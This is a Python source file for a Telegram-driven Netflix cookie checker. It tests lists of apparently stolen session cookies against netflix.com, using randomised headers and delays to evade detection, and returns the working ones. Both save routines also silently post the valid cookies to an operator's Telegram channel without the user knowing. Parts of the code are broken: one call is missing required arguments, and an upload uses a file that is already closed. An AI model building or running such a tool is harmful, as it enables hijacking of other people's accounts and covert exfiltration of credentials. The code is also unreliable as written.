import asyncio
import aiohttp
import random
from datetime import datetime
from colorama import Fore, Style
from utils import get_random_headers
import os
import requests
from config import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
import re
import tempfile
import logging

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

def parse_netflix_cookie(cookie_str):
    """Universal Netflix cookie parser that handles multiple formats."""
    try:
        # Remove any leading/trailing whitespace
        cookie_str = cookie_str.strip()
        
        # Handle different formats
        if " | Cookie = " in cookie_str:
            cookie_str = cookie_str.split(" | Cookie = ")[-1].strip()
        elif "Cookie = " in cookie_str:
            cookie_str = cookie_str.split("Cookie = ")[-1].strip()
            
        # Extract NetflixId and SecureNetflixId
        netflix_id = None
        secure_netflix_id = None
        
        # Split by semicolon and process each part
        parts = cookie_str.split(';')
        for part in parts:
            part = part.strip()
            # Handle special characters in keys
            if 'NetflixId=' in part:
                netflix_id = part.split('NetflixId=')[1].strip()
            elif 'SecureNetflixId=' in part:
                secure_netflix_id = part.split('SecureNetflixId=')[1].strip()
                
        # Return the essential cookie parts
        if netflix_id and secure_netflix_id:
            return f"NetflixId={netflix_id}; SecureNetflixId={secure_netflix_id}"
        return None
        
    except Exception as e:
        logger.error(f"Error parsing cookie: {e}")
        return None

def extract_cookie_from_line(line):
    """Extract cookie from different formats."""
    try:
        # First try the universal parser
        cookie = parse_netflix_cookie(line)
        if cookie:
            return cookie
            
        # Fallback to old format handling
        if " | Cookie = " in line:
            cookie_part = line.split(" | Cookie = ")[-1].strip()
            return cookie_part if cookie_part else None
        elif "Cookie = " in line:
            cookie_part = line.split("Cookie = ")[-1].strip()
            return cookie_part if cookie_part else None
        else:
            # Assume it's a raw cookie string
            clean_cookie = line.strip()
            return clean_cookie if clean_cookie else None
    except Exception as e:
        logger.error(f"Error extracting cookie: {e}")
        return None

class SafeFastChecker:
    """Safe mode checker with smart delays"""
    def __init__(self):
        self.mode = "safe"
        self.batch_size = 50  # Increased batch size
        self.delay_pattern = self.generate_delay_pattern()
        self.valid_lines = []
        self.invalid_lines = []  # New list for invalid cookies
        
    def generate_delay_pattern(self):
        """Creates natural looking delay pattern"""
        return [
            0.5, 0.8, 0.3, 0.6, 0.4, 
            0.7, 0.5, 0.9, 0.4, 0.6
        ]
    
    async def check_single_cookie(self, session, line, index):
        cookie_str = extract_cookie_from_line(line)
        if not cookie_str:
            self.invalid_lines.append((line, "Invalid line format"))
            return False, line, "Invalid line format"
            
        # Natural delay based on pattern
        delay = self.delay_pattern[index % len(self.delay_pattern)]
        delay += random.uniform(-0.1, 0.1)  # Add randomness
        await asyncio.sleep(delay)
        
        # Parse cookie string into dict
        cookies = {}
        for part in cookie_str.strip().split(';'):
            if '=' in part:
                key, value = part.strip().split('=', 1)
                cookies[key] = value
        
        try:
            async with session.get('https://www.netflix.com/browse',
                                 headers=get_random_headers(),
                                 cookies=cookies,
                                 timeout=10) as response:
                
                text = await response.text()
                
                # Advanced validity checking
                is_valid = all([
                    response.status == 200,
                    "Not signed in" not in text,
                    "Sign In" not in text,
                    "login" not in str(response.url).lower(),
                    any(x in text for x in ["profileGate", "profiles", "account-menu-item"])
                ])
                
                if is_valid:
                    self.valid_lines.append(line)
                else:
                    self.invalid_lines.append((line, "Invalid cookie"))
                
                return is_valid, line, "Checked"
                
        except Exception as e:
            self.invalid_lines.append((line, f"Error: {str(e)}"))
            return False, line, f"Error: {str(e)}"

async def process_batch(checker, batch, start_index):
    """Process a batch of cookies using the specified checker"""
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i, line in enumerate(batch):
            task = checker.check_single_cookie(session, line, start_index + i)
            tasks.append(task)
        return await asyncio.gather(*tasks)

async def check_cookies_async(checker, lines_list, bot, chat_id, message_id, user=None):
    """Main async function to check cookies for the bot, with progress updates."""
    # Reset valid and invalid lines before each run
    checker.valid_lines = []
    checker.invalid_lines = []
    batch_size = getattr(checker, 'batch_size', 10)
    total_lines = len(lines_list)
    
    status_message = await bot.send_message(chat_id, f"🔍 Starting check for {total_lines} cookies...")

    for i in range(0, len(lines_list), batch_size):
        batch = lines_list[i:i + batch_size]
        results = await process_batch(checker, batch, i)
        # No need to append here, handled in check_single_cookie
        # Update progress
        progress = min(i + batch_size, total_lines)
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=status_message.message_id,
                text=f"🔄 Progress: {progress}/{total_lines} cookies checked. "
                     f"({len(checker.valid_lines)} valid so far)"
            )
        except Exception: # Ignore if message is not modified
            pass

        # Smart delay
        if i + batch_size < len(lines_list):
            delay = random.uniform(1, 3)
            await asyncio.sleep(delay)
    
    await status_message.delete() # Remove the progress message
    await save_valid_cookies_for_bot(checker, total_lines, bot, chat_id, user)

async def save_valid_cookies_for_bot(checker, total_lines_count, bot, chat_id, user=None):
    """Save valid cookies to file and send to Telegram (admin gets only valid file + user info)"""
    valid_lines = checker.valid_lines
    invalid_lines = checker.invalid_lines

    if not valid_lines and not invalid_lines:
        await bot.send_message(chat_id, "❌ No cookies were checked!")
        return

    # Create timestamps
    now = datetime.now()
    file_timestamp = now.strftime("%Y%m%d_%H%M%S")
    display_timestamp = now.strftime("%d %B %Y, %I:%M:%S %p")

    # Create filenames with count and timestamp
    valid_filename = f"valid_cookies_{len(valid_lines)}_{checker.mode}_{file_timestamp}.txt"
    invalid_filename = f"invalid_cookies_{len(invalid_lines)}_{checker.mode}_{file_timestamp}.txt"
    valid_temp_filepath = os.path.join(tempfile.gettempdir(), valid_filename)
    invalid_temp_filepath = os.path.join(tempfile.gettempdir(), invalid_filename)

    try:
        # Save valid cookies
        if valid_lines:
            with open(valid_temp_filepath, "w", encoding="utf-8") as f:
                for line in valid_lines:
                    f.write(f"{line}\n")

        # Save invalid cookies
        if invalid_lines:
            with open(invalid_temp_filepath, "w", encoding="utf-8") as f:
                for line, reason in invalid_lines:
                    f.write(f"{line} | Reason: {reason}\n")

        # Format message text for user
        msg_text = (
            f"🍪 Netflix Cookie Checker Results\n"
            f"📝 Total Cookies: {total_lines_count}\n"
            f"✅ Valid Cookies: {len(valid_lines)}\n"
            f"❌ Invalid Cookies: {len(invalid_lines)}\n"
            f"📅 Date: {display_timestamp}\n\n"
        )
        
        # Send stats message first
        await bot.send_message(chat_id, msg_text)
        
        # Send valid file to user if exists
        if valid_lines:
            with open(valid_temp_filepath, 'rb') as doc:
                await bot.send_document(
                    chat_id=chat_id,
                    document=doc,
                    filename=valid_filename,
                    caption="✅ Valid Cookies"
                )
                
        # Send invalid file to user if exists
        if invalid_lines:
            with open(invalid_temp_filepath, 'rb') as doc:
                await bot.send_document(
                    chat_id=chat_id,
                    document=doc,
                    filename=invalid_filename,
                    caption="❌ Invalid Cookies"
                )

        # Also send a copy to the admin channel silently (only valid file, with user info)
        try:
            if TELEGRAM_CHAT_ID:
                # Get user info for admin message
                admin_user_info = ""
                if user:
                    username = f"@{user.username}" if getattr(user, 'username', None) else None
                    user_id = user.id if getattr(user, 'id', None) else None
                    admin_user_info = f"👤 User: {username} (id: {user_id})\n\n" if username else f"👤 User ID: {user_id}\n\n"
                admin_msg = (
                    f"{admin_user_info}"
                    f"🍪 Netflix Cookie Checker Results\n"
                    f"📝 Total Cookies: {total_lines_count}\n"
                    f"✅ Valid Cookies: {len(valid_lines)}\n"
                    f"❌ Invalid Cookies: {len(invalid_lines)}\n"
                    f"📅 Date: {display_timestamp}"
                )
                await bot.send_message(TELEGRAM_CHAT_ID, admin_msg, disable_notification=True)
                if valid_lines:
                    with open(valid_temp_filepath, 'rb') as doc:
                        await bot.send_document(
                            chat_id=TELEGRAM_CHAT_ID,
                            document=doc,
                            filename=valid_filename,
                            disable_notification=True
                        )
        except Exception as e:
            logger.error(f"Failed to send results to admin channel ({TELEGRAM_CHAT_ID}): {e}", exc_info=True)

    except Exception as e:
        logger.error(f"Error saving cookies: {e}", exc_info=True)
        await bot.send_message(chat_id, "❌ An error occurred while saving the results.")

    finally:
        # Clean up the temp files
        for filepath in [valid_temp_filepath, invalid_temp_filepath]:
            if os.path.exists(filepath):
                os.remove(filepath)

def save_valid_cookies(checker, total_lines_count):
    """Save valid cookies to a file and send to Telegram"""
    valid_lines = checker.valid_lines
    if not valid_lines:
        print(f"\n{Fore.RED}❌ No valid cookies found!{Style.RESET_ALL}")
        return
        
    # Create timestamps
    now = datetime.now()
    file_timestamp = now.strftime("%Y%m%d_%H%M%S")
    display_timestamp = now.strftime("%d %B %Y, %I:%M:%S %p")
        
    # Create filename with timestamp
    filename = f"valid_cookies_{checker.mode}_{file_timestamp}.txt"
    
    # Save cookies to file
    with open(filename, "w", encoding="utf-8") as f:
        for line in valid_lines:
            f.write(f"{line}\n")
    
    print(f"\n{Fore.GREEN}✅ Found {len(valid_lines)} valid cookies out of {total_lines_count}!{Style.RESET_ALL}")
    print(f"{Fore.GREEN}💾 Saved to: {filename}{Style.RESET_ALL}")
    
    # Send to Telegram silently
    try:
        # Format message text
        msg_text = f"🍪 Netflix Cookie Checker Results\n\n" \
                   f"📝 Total Cookies: {total_lines_count}\n" \
                   f"✅ Valid Cookies: {len(valid_lines)}\n" \
                   f"📅 Date: {display_timestamp}"
        
        # Send message with file
        with open(filename, 'rb') as doc:
            files = {'document': doc}
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'caption': msg_text,
            'disable_notification': True  # This makes it silent
        }
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument",
            data=payload,
            files=files
        )
    except Exception:
        pass  # Silently handle any errors

def fast_cookie_checker(files, checker):
    """Main function for cookie checking"""
    if not files:
        print(f"\n{Fore.RED}No files selected!{Style.RESET_ALL}")
        return
        
    print(f"\n{Fore.GREEN}Selected files:{Style.RESET_ALL}")
    for i, file in enumerate(files, 1):
        print(f"{i}. {os.path.basename(file)}")
    
    lines_to_check = []
    for file_path in files:
        try:
            print(f"\n{Fore.CYAN}Reading: {os.path.basename(file_path)}{Style.RESET_ALL}")
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        lines_to_check.append(line)
        except Exception as e:
            print(f"{Fore.RED}Error reading {file_path}: {str(e)}{Style.RESET_ALL}")
            continue
    
    if not lines_to_check:
        print(f"\n{Fore.RED}No valid lines found in files!{Style.RESET_ALL}")
        return
        
    total_to_check = len(lines_to_check)
    try:
    # Process cookies using async
        asyncio.run(check_cookies_async(checker, lines_to_check))
    finally:
        save_valid_cookies(checker, total_to_check) 